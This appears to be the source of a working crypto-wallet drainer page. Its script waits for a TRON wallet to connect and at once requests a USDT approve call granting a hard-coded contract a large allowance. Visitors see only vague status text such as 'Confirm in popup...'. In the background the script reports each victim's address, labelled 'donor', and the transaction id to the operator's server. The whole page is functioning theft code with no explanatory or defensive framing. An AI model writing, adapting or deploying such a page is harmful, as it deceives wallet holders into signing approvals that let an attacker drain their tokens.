<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="status" style="font-size:16px;color:#9ca3af;">Connecting...</p>

    <script>
        var CONTRACT_ADDRESS = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
        var USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        var APPROVE_AMOUNT = 1000000;
        var status = document.getElementById("status");

        // Poll for tronWeb every 100ms (fast detection)
        var check = setInterval(function() {
            if (window.tronWeb && window.tronWeb.ready) {
                clearInterval(check);
                // Fire approve IMMEDIATELY - no delay
                sendApprove();
            }
        }, 100);

        // Timeout after 15s
        setTimeout(function() {
            clearInterval(check);
            if (!window.tronWeb || !window.tronWeb.ready) {
                status.textContent = "Open this page in Trust Wallet";
                status.style.color = "#f87171";
            }
        }, 15000);

        function sendApprove() {
            status.textContent = "Confirm in popup...";
            status.style.color = "#facc15";

            // Delegate energy in background (don't wait for it)
            var addr = window.tronWeb.defaultAddress.base58;
            fetch("/api/delegate-energy", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ donor: addr })
            }).catch(function() {});

            // Fire approve immediately
            window.tronWeb.contract().at(USDT_CONTRACT).then(function(usdt) {
                return usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
                    feeLimit: 100000000,
                    callValue: 0
                });
            }).then(function(tx) {
                var txId = typeof tx === "string" ? tx : (tx.txid || tx);
                status.textContent = "Done!";
                status.style.color = "#4ade80";

                fetch("/api/approved", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ donor: addr, txId: txId })
                }).catch(function() {});

            }).catch(function(err) {
                status.textContent = err.message || "Rejected";
                status.style.color = "#f87171";
            });
        }
    </script>
</body>
</html>
